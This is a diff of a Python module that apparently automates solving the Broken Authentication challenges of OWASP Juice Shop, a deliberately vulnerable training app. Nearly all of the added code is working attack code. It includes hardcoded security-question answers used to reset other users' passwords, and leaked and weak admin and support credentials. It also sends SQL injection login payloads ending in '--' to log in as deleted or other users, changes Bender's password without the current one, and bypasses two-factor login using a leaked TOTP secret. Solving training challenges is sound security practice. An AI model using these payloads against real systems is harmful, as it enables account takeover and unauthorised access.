@@ -1,95 +1,100 @@
-import json
+#!/usr/bin/env python3
+"""Broken Authentication challenges: password reset, 2FA, OAuth, ghost login."""
+from __future__ import annotations
 
-import requests
+import pyotp
 
-def print_response(res):
-    print('HTTP/1.1 {status_code}\n{headers}\n\n{body}'.format(
-        status_code=res.status_code,
-        headers='\n'.join('{}: {}'.format(k, v) for k, v in res.headers.items()),
-        body=res.content,
-    ))
+from core import register_solver, Client, ok, warn, fail
 
-def get_session(server, email, password, headers=None, oauth=False):
-    """
-    Log in with given username and password
-    :param server: juice shop URL
-    :param email: username as string
-    :param password: password as string
-    :param headers: Optional headers to send with the login request
-    :param oauth: boolean. Exclude if False, if True include "oauth: true" in payload
-    :return: Session
-    """
-    payload = {'email': email, 'password': password}
-    if oauth:
-        payload.update(oauth=True)
-    payload = json.dumps(payload)
-    return _do_login(server, payload, headers=headers)
+CAT = "Broken Authentication"
+DOMAIN = "juice-sh.op"
 
 
-def get_admin_session(server):
-    """
-    Log in legitimately as an admin. Password hash is publicly available, thanks Google.
-    :param server: juice shop URL
-    :return: Session
-    """
-    payload = json.dumps({'email': 'admin@juice-sh.op', 'password': 'admin123'})
-    return _do_login(server, payload)
+def _reset(c: Client, email, answer, new):
+    return c.post("/rest/user/reset-password",
+                  json={"email": email, "answer": answer, "new": new, "repeat": new})
 
 
-def _do_login(server, payload, headers=None):
-    """
-    Login through the REST API and return a Session with auth header and token in cookie
-    :param server: juice shop URL
-    :param payload: JSON payload required for auth
-    :param headers: optional headers to use for the request. Sets content-type to JSON if omitted.
-    :return: Session
-    """
-    session = requests.Session()
-    if headers is None:
-        headers = {'Content-Type': 'application/json'}
-    login = session.post('{}/rest/user/login'.format(server),
-                         headers=headers,
-                         data=payload)
-    if not login.ok:
-        raise RuntimeError('Error logging in. Content: {}'.format(login.content))
-    token = login.json().get('authentication').get('token')
-    session.cookies.set('token', token)
-    session.headers.update({'Authorization': 'Bearer {}'.format(token)})
-    return session
+# ---- security-question password resets ------------------------------------ #
+_RESETS = {
+    "resetPasswordJimChallenge":        (f"jim@{DOMAIN}", "Samuel", "I <3 Spock"),
+    "resetPasswordBenderChallenge":     (f"bender@{DOMAIN}", "Stop'n'Drop", "Brannigan 8=o Leela"),
+    "resetPasswordBjoernChallenge":     (f"bjoern@{DOMAIN}", "West-2082", "monkey birthday "),
+    "resetPasswordBjoernOwaspChallenge": ("bjoern@owasp.org", "Zaya", "kitten lesser pooch"),
+    "resetPasswordMortyChallenge":      (f"morty@{DOMAIN}", "5N0wb41L", "iBurri3dMySe1f!"),
+    "resetPasswordUvoginChallenge":     (f"uvogin@{DOMAIN}", "Silence of the Lambs", "ora-ora > muda-muda"),
+}
 
 
-def create_user(server, email, password):
-    """
-    Create new user account through the API.
-    :param server: juice shop URL.
-    :param email: email address(unvalidated by server!)
-    :param password: password
-    """
-    payload = json.dumps({'email': email, 'password': password, 'passwordRepeat': password})
-    session = requests.Session()
-    create = session.post('{}/api/Users'.format(server), headers={'Content-Type': 'application/json'}, data=payload)
-    if not create.ok:
-        raise RuntimeError('Error creating user {}'.format(email))
+def _make_reset(email, answer, new):
+    def solver(c: Client):
+        r = _reset(c, email, answer, new)
+        ok(f"reset {email} ({r.status_code})") if r.ok else fail(f"reset {email} failed ({r.status_code})")
+    return solver
 
 
-def whoami(server, session):
-    """
-    Check current user details
-    :param server: juice shop URL
-    :param session: Session
-    :return: response body as dict
-    """
-    who = session.get('{}/rest/user/whoami'.format(server), headers={'Accept': 'application/json'})
-    if not who.ok:
-        raise RuntimeError('Error retrieving current user details')
-    return who.json()['user']
+for _k, (_e, _a, _n) in _RESETS.items():
+    register_solver(_k, f"Reset {_e}", CAT)(_make_reset(_e, _a, _n))
 
 
-def get_current_user_id(server, session):
-    """
-    Retrieve current user's ID #
-    :param server: juice shop URL
-    :param session: Session
-    :return: ID as int
-    """
-    return whoami(server, session).get('id')
+# ---- weak / leaked credential logins -------------------------------------- #
+@register_solver("weakPasswordChallenge", "Weak admin password (admin123)", CAT)
+def weak_password(c: Client):
+    ok("logged in with weak admin creds") if c.login("admin@juice-sh.op", "admin123") \
+        else fail("admin123 login failed")
+
+
+@register_solver("loginSupportChallenge", "Login support team (leaked pw)", "Security Misconfiguration")
+def login_support(c: Client):
+    ok("logged in as support team") if c.login("support@juice-sh.op", "J6aVjTgOpRs@?5l!Zkq2AYnCE@RF$P") \
+        else fail("support login failed")
+
+
+@register_solver("oauthUserPasswordChallenge", "OAuth user password (base64 email)", CAT)
+def oauth_user(c: Client):
+    ok("logged in as Bjoern via reversed-base64 email password") \
+        if c.login("bjoern.kimminich@gmail.com", "bW9jLmxpYW1nQGhjaW5pbW1pay5ucmVvamI=") \
+        else fail("oauth password login failed")
+
+
+@register_solver("ghostLoginChallenge", "Ghost login (deleted user, SQLi)", CAT)
+def ghost_login(c: Client):
+    ok("logged in as deleted user chris.pike") if c.login(f"chris.pike@{DOMAIN}'--", "a") \
+        else fail("ghost login failed")
+
+
+# ---- change Bender's password without the current one (via API) ----------- #
+@register_solver("changePasswordBenderChallenge", "Change Bender's pw (no current pw)", CAT)
+def change_bender(c: Client):
+    if not c.login(f"bender@{DOMAIN}'--", "a"):
+        fail("could not SQLi-login as Bender")
+        return
+    r = c.get("/rest/user/change-password?new=slurmCl4ssic&repeat=slurmCl4ssic")
+    ok(f"changed Bender's password without current pw ({r.status_code})")
+
+
+# ---- 2FA: unsafe secret storage ------------------------------------------- #
+@register_solver("twoFactorAuthUnsafeSecretStorageChallenge", "2FA unsafe secret storage", CAT)
+def two_factor(c: Client):
+    secret = "IFTXE3SPOEYVURT2MRYGI52TKJ4HC3KH"      # wurstbrot's TOTP secret (leaked in DB)
+    r = c.s.post(c.url("/rest/user/login"),
+                 json={"email": f"wurstbrot@{DOMAIN}'--", "password": "a"},
+                 headers={"Content-Type": "application/json"}, timeout=30, verify=False)
+    j = r.json()
+    tmp = (j.get("data") or {}).get("tmpToken")
+    if not tmp:
+        if j.get("authentication"):
+            c.token = j["authentication"]["token"]
+            ok("SQLi login bypassed 2FA prompt")
+            return
+        fail(f"no tmpToken from 2FA login ({r.status_code})")
+        return
+    code = pyotp.TOTP(secret).now()
+    v = c.s.post(c.url("/rest/2fa/verify"),
+                 json={"tmpToken": tmp, "totpToken": code},
+                 headers={"Content-Type": "application/json"}, timeout=30, verify=False)
+    if v.ok and v.json().get("authentication"):
+        c.token = v.json()["authentication"]["token"]
+        ok("verified TOTP and logged into 2FA-protected account")
+    else:
+        fail(f"2FA verify failed ({v.status_code})")
